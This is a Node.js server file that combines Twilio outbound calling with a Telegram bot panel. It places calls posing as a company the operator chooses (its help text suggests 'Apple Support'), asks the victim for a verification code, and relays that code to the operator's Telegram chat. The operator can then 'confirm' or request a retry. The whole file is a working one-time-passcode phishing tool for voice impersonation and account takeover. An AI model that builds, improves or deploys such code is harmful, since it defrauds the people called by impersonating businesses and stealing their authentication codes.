const express = require("express");
const bodyParser = require("body-parser");
const fetch = require("node-fetch");
const twilio = require("twilio");

const app = express();
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

const PORT = process.env.PORT || 3000;

// ===== ENV =====
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

const TWILIO_ACCOUNT_SID = process.env.TWILIO_ACCOUNT_SID || process.env.TWILIO_SID;
const TWILIO_AUTH_TOKEN = process.env.TWILIO_AUTH_TOKEN || process.env.TWILIO_TOKEN;
const TWILIO_NUMBER = process.env.TWILIO_NUMBER;

const BASE_URL = process.env.BASE_URL;

const client = twilio(TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN);

// ===== SETTINGS =====
let settings = {
  company: "Support",
  digits: 6,
  assistant: 0
};

const assistants = [
  { name: "Nova", voice: "Polly.Joanna" },
  { name: "Lyra", voice: "Polly.Matthew" },
  { name: "Orion", voice: "Polly.Amy" },
  { name: "Astra", voice: "Polly.Brian" },
  { name: "Kairo", voice: "Polly.Justin" },
  { name: "Solara", voice: "Polly.Kendra" }
];

// ===== STATE =====
let activeCallSid = null;
let activeCaller = null;
let activeCode = null;
let callStart = null;
let callStatus = "Idle";
let lastCaller = null;

let logs = [];
let panelMessageId = null;
let pendingInput = null; // "call", "company", "digits", "assistant"

// ===== HELPERS =====
function assistant() {
  return assistants[settings.assistant] || assistants[0];
}

function pushLog(text) {
  logs.unshift(`${new Date().toLocaleTimeString()} ${text}`);
  logs = logs.slice(0, 10);
}

function currentSeconds() {
  if (!callStart) return 0;
  return Math.floor((Date.now() - callStart) / 1000);
}

function currentTimerText() {
  const secs = currentSeconds();
  const mm = String(Math.floor(secs / 60)).padStart(2, "0");
  const ss = String(secs % 60).padStart(2, "0");
  return `${mm}:${ss}`;
}

// ===== TELEGRAM =====
async function tg(method, data) {
  const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/${method}`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(data)
  });
  return res.json();
}

async function tgSend(text, buttons = null) {
  const body = {
    chat_id: CHAT_ID,
    text
  };

  if (buttons) {
    body.reply_markup = { inline_keyboard: buttons };
  }

  return tg("sendMessage", body);
}

async function tgEdit(messageId, text, buttons = null) {
  const body = {
    chat_id: CHAT_ID,
    message_id: messageId,
    text
  };

  if (buttons) {
    body.reply_markup = { inline_keyboard: buttons };
  }

  return tg("editMessageText", body);
}

async function tgAnswerCallback(callbackQueryId, text = "") {
  try {
    await tg("answerCallbackQuery", {
      callback_query_id: callbackQueryId,
      text
    });
  } catch {}
}

// ===== PANEL =====
function panelButtons() {
  return [
    [
      { text: "✔ Confirm", callback_data: "confirm" },
      { text: "🔁 Retry", callback_data: "retry" }
    ],
    [
      { text: "⛔ Hang Up", callback_data: "hangup" }
    ],
    [
      { text: "📞 Call Last", callback_data: "calllast" },
      { text: "📲 Call", callback_data: "call" }
    ],
    [
      { text: "📊 Status", callback_data: "status" },
      { text: "📜 Logs", callback_data: "logs" }
    ]
  ];
}

function panelText() {
  let statusBlock = "No active call";

  if (callStatus === "Ringing") {
    statusBlock = `📞 Ringing
Number: ${activeCaller || "Unknown"}
Time: ${currentTimerText()}`;
  }

  if (callStatus === "Answered") {
    statusBlock = `✅ Answered
Number: ${activeCaller || "Unknown"}
Time: ${currentTimerText()}
Code: ${activeCode || "waiting"}`;
  }

  if (callStatus === "Ended") {
    statusBlock = `❌ Call Ended
Number: ${activeCaller || "Unknown"}`;
  }

  if (callStatus === "Idle") {
    statusBlock = "No active call";
  }

  return `📞 IVR Control Panel

${statusBlock}

Company: ${settings.company}
Digits: ${settings.digits}
Assistant: ${assistant().name}`;
}

async function updatePanel(forceNew = false) {
  try {
    const text = panelText();
    const buttons = panelButtons();

    if (!panelMessageId || forceNew) {
      const msg = await tgSend(text, buttons);
      if (msg && msg.result && msg.result.message_id) {
        panelMessageId = msg.result.message_id;
      }
      return;
    }

    await tgEdit(panelMessageId, text, buttons);
  } catch {
    // ignore edit noise / temporary Telegram issues
  }
}

// ===== TWILIO CALL CONTROL =====
async function startCall(number) {
  if (!number) return;

  await client.calls.create({
    url: `${BASE_URL}/ivr`,
    to: number,
    from: TWILIO_NUMBER,
    statusCallback: `${BASE_URL}/call-status`,
    statusCallbackEvent: ["initiated", "ringing", "answered", "completed"],
    statusCallbackMethod: "POST"
  });

  pushLog(`Outbound call started to ${number}`);
}

async function updateLiveCallTwiml(twiml) {
  if (!activeCallSid) return;
  await client.calls(activeCallSid).update({ twiml });
}

async function endLiveCallImmediately() {
  if (!activeCallSid) return;
  await client.calls(activeCallSid).update({
    twiml: `<Response><Hangup/></Response>`
  });
}

// ===== ROOT =====
app.get("/", (req, res) => {
  res.send("Server running");
});

// Optional browser test route
app.get("/ivr", (req, res) => {
  res.type("text/xml");
  res.send(`<Response><Say>IVR endpoint is working.</Say></Response>`);
});

// ===== CALL STATUS WEBHOOK =====
app.post("/call-status", async (req, res) => {
  try {
    const status = req.body.CallStatus;
    const from = req.body.From;
    const sid = req.body.CallSid;

    if (from) activeCaller = from;
    if (sid) activeCallSid = sid;

    if (status === "ringing") {
      callStatus = "Ringing";
      if (!callStart) callStart = Date.now();
    }

    if (status === "in-progress" || status === "answered") {
      callStatus = "Answered";
      if (!callStart) callStart = Date.now();
    }

    if (status === "completed") {
      callStatus = "Ended";
      activeCallSid = null;
      activeCode = null;
    }

    updatePanel();
  } catch (e) {
    console.log("call-status error:", e.message);
  }

  res.sendStatus(200);
});

// ===== IVR START =====
app.post("/ivr", async (req, res) => {
  try {
    activeCaller = req.body.From || activeCaller;
    activeCallSid = req.body.CallSid || activeCallSid;
    lastCaller = req.body.From || lastCaller;

    if (!callStart) callStart = Date.now();
    callStatus = "Answered";

    updatePanel();

    res.type("text/xml");
    res.send(`
<Response>
<Say voice="${assistant().voice}">
Hello from ${settings.company}. Please enter your ${settings.digits} digit code.
</Say>
<Gather numDigits="${settings.digits}" action="${BASE_URL}/code" method="POST" timeout="8"/>
</Response>
`);
  } catch (e) {
    console.log("/ivr error:", e.message);
    res.type("text/xml");
    res.send(`<Response><Say>Application error.</Say></Response>`);
  }
});

// ===== CODE RECEIVED =====
app.post("/code", async (req, res) => {
  try {
    const digits = req.body.Digits;
    const caller = req.body.From;
    const sid = req.body.CallSid;

    activeCallSid = sid;
    activeCaller = caller;
    activeCode = digits;
    callStatus = "Answered";
    callStart = Date.now();
    lastCaller = caller;

    pushLog(`${caller} : ${digits}`);

    // respond to caller first
    res.type("text/xml");
    res.send(`
<Response>
<Say voice="${assistant().voice}">
Please wait while we verify your code.
</Say>
<Redirect method="POST">${BASE_URL}/hold</Redirect>
</Response>
`);

    // telegram afterwards
    setTimeout(async () => {
      try {
        await tgSend(`📞 CODE RECEIVED

Caller: ${caller}
Code: ${digits}`);
        await updatePanel();
      } catch (e) {
        console.log("post-code telegram error:", e.message);
      }
    }, 0);
  } catch (e) {
    console.log("/code error:", e.message);
    res.type("text/xml");
    res.send(`<Response><Say>Application error.</Say></Response>`);
  }
});

// ===== HOLD LOOP =====
app.post("/hold", (req, res) => {
  res.type("text/xml");
  res.send(`
<Response>
<Pause length="10"/>
<Redirect method="POST">${BASE_URL}/hold</Redirect>
</Response>
`);
});

// ===== TELEGRAM WEBHOOK =====
app.post("/telegram", async (req, res) => {
  const update = req.body;

  try {
    // ===== BUTTONS =====
    if (update.callback_query) {
      const action = update.callback_query.data;
      const callbackId = update.callback_query.id;

      if (action === "confirm") {
        await updateLiveCallTwiml(`
<Response>
<Say voice="${assistant().voice}">
Thank you. Your code has been confirmed. Have a great day.
</Say>
<Hangup/>
</Response>
`);
        pushLog("Confirmed");
        callStatus = "Ended";
        activeCallSid = null;
        activeCode = null;
        callStart = null;
        await updatePanel();
        await tgAnswerCallback(callbackId, "Confirmed");
      }

      if (action === "retry") {
        await updateLiveCallTwiml(`
<Response>
<Say voice="${assistant().voice}">
Please re-enter your code.
</Say>
<Gather numDigits="${settings.digits}" action="${BASE_URL}/code" method="POST" timeout="8"/>
</Response>
`);
        pushLog("Retry requested");
        activeCode = null;
        await updatePanel();
        await tgAnswerCallback(callbackId, "Retry sent");
      }

      if (action === "hangup") {
        await endLiveCallImmediately();
        pushLog("Hung up");
        callStatus = "Ended";
        activeCallSid = null;
        activeCode = null;
        callStart = null;
        await updatePanel();
        await tgAnswerCallback(callbackId, "Hung up");
      }

      if (action === "calllast") {
        if (lastCaller) {
          await startCall(lastCaller);
          await tgSend(`📞 Calling last caller ${lastCaller}`);
        } else {
          await tgSend("No last caller available");
        }
        await tgAnswerCallback(callbackId, "Calling");
      }

      if (action === "call") {
        pendingInput = "call";
        await tgSend("Send the number to call.\nExample:\n/call +447123456789");
        await tgAnswerCallback(callbackId, "Waiting for number");
      }

      if (action === "status") {
        await updatePanel();
        await tgAnswerCallback(callbackId, "Panel refreshed");
      }

      if (action === "logs") {
        let text = "📜 Logs\n\n";
        logs.forEach(l => {
          text += l + "\n";
        });
        await tgSend(text);
        await tgAnswerCallback(callbackId, "Logs sent");
      }
    }

    // ===== COMMANDS =====
    if (update.message && update.message.text) {
      const text = update.message.text.trim();

      if (pendingInput === "call" && !text.startsWith("/")) {
        pendingInput = null;
        await startCall(text);
        await tgSend(`📞 Calling ${text}`);
        return res.sendStatus(200);
      }

      if (text === "/panel" || text === "/menu" || text === "/status") {
        panelMessageId = null;
        await updatePanel(true);
      }

      if (text === "/help") {
        await tgSend(`🤖 Help

/panel - open control panel
/menu - open control panel
/status - refresh control panel
/logs - show logs
/call +number - call a number
/calllast - call last caller
/digits 6 - set digits
/assistant 2 - set assistant
/company Apple Support - set company
/settings - show current settings
/commands - show command list`);
      }

      if (text === "/settings") {
        await tgSend(`⚙ Current Settings

Company: ${settings.company}
Digits: ${settings.digits}
Assistant: ${assistant().name}`);
      }

      if (text === "/commands") {
        await tgSend(`⚙ Commands

/panel
/menu
/status
/logs
/call +number
/calllast
/digits X
/assistant X
/company NAME
/help
/settings`);
      }

      if (text.startsWith("/call ")) {
        const number = text.split(" ")[1];
        if (!number) {
          await tgSend("Usage: /call +447xxxxxxxx");
        } else {
          await startCall(number);
          await tgSend(`📞 Calling ${number}`);
        }
      }

      if (text === "/calllast") {
        if (!lastCaller) {
          await tgSend("No last caller available");
        } else {
          await startCall(lastCaller);
          await tgSend(`📞 Calling ${lastCaller}`);
        }
      }

      if (text.startsWith("/digits")) {
        const d = parseInt(text.split(" ")[1], 10);
        if (d >= 2 && d <= 10) {
          settings.digits = d;
          await tgSend(`✅ ${d} digits set`);
          await updatePanel();
        } else {
          await tgSend("Use /digits 2 to 10");
        }
      }

      if (text.startsWith("/assistant")) {
        const a = parseInt(text.split(" ")[1], 10);
        if (a >= 1 && a <= assistants.length) {
          settings.assistant = a - 1;
          await tgSend(`🎙 ${assistant().name} assistant set`);
          await updatePanel();
        } else {
          await tgSend("Use /assistant 1 to 6");
        }
      }

      if (text.startsWith("/company")) {
        const name = text.replace("/company", "").trim();
        if (!name) {
          await tgSend("Usage: /company Apple Support");
        } else {
          settings.company = name;
          await tgSend(`🏢 Company set to ${settings.company}`);
          await updatePanel();
        }
      }

      if (text === "/logs") {
        let textOut = "📜 Logs\n\n";
        logs.forEach(l => {
          textOut += l + "\n";
        });
        await tgSend(textOut);
      }
    }
  } catch (e) {
    console.log("/telegram error:", e.message);
  }

  res.sendStatus(200);
});

// ===== LIVE PANEL UPDATE =====
setInterval(() => {
  if (panelMessageId) {
    updatePanel();
  }
}, 1000);

app.listen(PORT, () => {
  console.log("Server started");
});
